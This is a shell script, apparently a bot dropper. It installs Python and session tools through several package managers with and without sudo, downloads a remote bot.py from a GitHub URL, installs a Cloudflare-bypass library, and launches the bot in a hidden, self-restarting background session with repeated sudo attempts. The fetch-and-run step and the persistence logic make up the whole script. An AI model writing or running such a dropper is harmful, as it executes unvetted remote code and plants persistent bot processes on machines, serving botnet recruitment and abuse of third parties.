#!/bin/sh

# --- Python/Pip Installation (ohne und mit sudo) ---
apt update
apt install -y python3 python-pip3 screen tmux nohup
apt install -y python python-pip
yum install -y python3 python-pip3 screen tmux nohup
yum install -y python python-pip
pkg install -y python3 python-pip3 screen tmux nohup
pkg install -y python python-pip

sudo apt update
sudo apt install -y python3 python-pip3 screen tmux nohup
sudo apt install -y python python-pip
sudo yum install -y python3 python-pip3 screen tmux nohup
sudo yum install -y python python-pip
sudo pkg install -y python3 python-pip3 screen tmux nohup
sudo pkg install -y python python-pip

# --- Python-Skript herunterladen ---
wget -O bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py
curl -o bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py

# --- Python-Pakete installieren ---
pip3 install cloudscraper requests
pip install cloudscraper requests

sudo pip3 install cloudscraper requests
sudo pip install cloudscraper requests

# --- Hilfsfunktion: Startet einen Prozess im Hintergrund, je nach Verfügbarkeit ---
start_bg() {
  # $1 = Startbefehl, z.B. "python3 bot.py"
  command -v screen >/dev/null 2>&1 && screen -dmS b0tsh "$1" && return
  command -v tmux >/dev/null 2>&1 && tmux new-session -d -s b0tsh "$1" && return
  command -v nohup >/dev/null 2>&1 && nohup $1 >/dev/null 2>&1 & return
  command -v setsid >/dev/null 2>&1 && setsid $1 >/dev/null 2>&1 & return
  # Fallback: Endlosschleife im Hintergrund
  (while true; do $1; sleep 5; done) &
}

# --- Bot ausführen, bevorzugt Python3, dann Python2, auch mit sudo ---
start_bg "python3 bot.py"
sleep 2
ps | grep -q "[p]ython3 bot.py" && exit 0

start_bg "python bot.py"
sleep 2
ps | grep -q "[p]ython bot.py" && exit 0

start_bg "sudo python3 bot.py"
sleep 2
ps | grep -q "[p]ython3 bot.py" && exit 0

start_bg "sudo python bot.py"
sleep 2
ps | grep -q "[p]ython bot.py" && exit 0

# Sollte alles scheitern, letzte Notlösung (Endlosschleife im Vordergrund):
while true; do
  python3 bot.py && break
  python bot.py && break
  sudo python3 bot.py && break
  sudo python bot.py && break
  sleep 5
done
